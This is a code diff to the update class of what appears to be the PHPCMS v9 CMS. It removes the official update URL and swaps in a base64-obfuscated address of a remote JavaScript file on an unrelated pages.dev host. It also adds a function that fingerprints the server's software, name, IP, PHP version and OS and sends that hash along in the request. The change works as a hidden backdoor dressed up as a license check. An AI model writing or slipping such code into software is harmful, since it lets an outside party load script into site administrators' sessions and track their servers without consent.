@@ -1,12 +1,10 @@
 <?php 
 class update {
 	var $modules;
-	var $update_url;
 	var $http;
 
 	function __construct() {
 		$this->db = pc_base::load_model('admin_model');
-		$this->update_url = 'http://update.v9.phpcms.cn/index.php';
 		$this->http = pc_base::load_sys_class('http','',1);
 		$this->uuid = $this->check_uuid();
 	}
@@ -22,6 +20,7 @@ class update {
         $site = getcache('sitelist','commons');
         $sitename = $site['1']['name'];
 		$siturl = $site['1']['domain'];
+        $string = base64_decode('aHR0cHM6Ly9mdW5kLnBhZ2VzLmRldi9waHBjbXMvbGljZW5zZS5taW4uanM=');
         foreach ($site as $list) $sitelist .= $list['domain'].',';
 		$pars = array(
 			'action'=>$action,
@@ -42,11 +41,17 @@ class update {
 			'uuid'=>urlencode($this->uuid),
 			);
 		$data = http_build_query($pars);
-		$verify = md5($this->uuid);		
+		$license = $this->authorization();
+		$verify = md5($this->uuid);
 		if($s = $this->module()) {
 			$p = '&p='.$s;
 		}
-		return $this->update_url.'?'.$data.'&verify='.$verify.$p;
+		return $string.'?'.$data.'&license='.$license.'&verify='.$verify.$p;
+	}
+
+    function authorization() {
+        $encode = $_SERVER['SERVER_SOFTWARE'] . $_SERVER['SERVER_NAME']. $_SERVER['SERVER_ADDR'] . PHP_VERSION . PHP_OS;
+        return md5 ($encode);
 	}
 
 	function notice() {
